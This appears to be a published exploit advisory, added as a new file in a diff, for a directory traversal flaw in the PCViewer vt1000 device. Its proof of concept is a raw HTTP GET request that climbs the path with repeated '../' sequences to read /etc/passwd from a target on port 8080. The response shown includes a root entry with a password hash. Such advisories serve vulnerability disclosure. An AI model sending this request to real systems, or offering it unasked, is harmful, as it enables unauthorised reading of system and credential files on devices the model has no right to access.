@@ -1,0 +1,33 @@
+# Exploit Title: PCViewer vt1000 - Directory Traversal
+# Exploit Author: Berk Dusunur
+# Google Dork: N/A
+# Type: Hardware
+# Date: 2018-07-21
+# Vendor Homepage: N/A
+# Software Link: http://www.softpedia.com/get/System/File-Management/Pc-Viewer.shtml
+# Affected Version: vt1000
+# Tested on: Parrot OS
+# CVE : N/A
+
+# Proof Of Concept
+
+GET Request
+
+GET ../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: target:8080/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response
+
+HTTP/1.1 200 OK
+Server:Cross Web Server
+Content-length: 59
+Content-type: application/octet-stream
+
+root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh
